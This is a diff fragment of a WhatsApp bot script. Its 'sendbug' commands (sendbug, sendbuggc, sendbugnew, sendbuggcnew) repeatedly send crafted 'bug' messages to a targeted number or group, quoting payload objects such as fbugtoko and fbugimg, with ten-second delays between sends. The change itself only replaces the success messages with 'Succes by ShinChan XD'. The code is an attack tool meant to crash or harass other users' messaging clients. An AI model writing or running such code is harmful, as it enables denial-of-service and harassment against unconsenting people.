@@ -5109,6 +5109,7 @@ break
 case 'sendbug' : {
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await kirbotz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+b = await kirbotz.sendMessage(m.chat, {text: "Succes by ShinChan XD"})
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
 await sleep(10000)
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
@@ -5129,11 +5130,11 @@ kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {
 await sleep(10000)
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
 }
-replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
 break
 case 'sendbuggc' : {
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
 a = await kirbotz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+b = await kirbotz.sendMessage(m.chat, {text: "Succes by ShinChan XD"})
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
 await sleep(10000)
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
@@ -5154,10 +5155,10 @@ kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {
 await sleep(10000)
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
 }
-replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
 break
 case 'sendbugnew' : {
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+a = await kirbotz.sendMessage(m.chat, {text: "Succes by ShinChan XD"})
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:fbugtoko})
 await sleep(10000)
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbuglokasi})
@@ -5178,10 +5179,10 @@ kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: f
 await sleep(10000)
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugimg})
 }
-replyNya('Sukses Send Bug By ❖❬ sʜɪɴᴄʜᴀɴ メ sᴇɴᴘᴀɪ 仫 ❭❖')
 break
 case 'sendbuggcnew' : {
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+a = await kirbotz.sendMessage(m.chat, {text: "Succes by ShinChan XD"})
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:fbugtoko})
 await sleep(10000)
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbuglokasi})
@@ -5202,7 +5203,6 @@ kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: f
 await sleep(10000)
 kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugimg})
 }
-replyNya('Sukses Send Bug By ❖❬ sʜɪɴᴄʜᴀɴ メ sᴇɴᴘᴀɪ 仫 ❭❖')
 break
 case 'join': {
 if (!isCreator) throw mess.owner
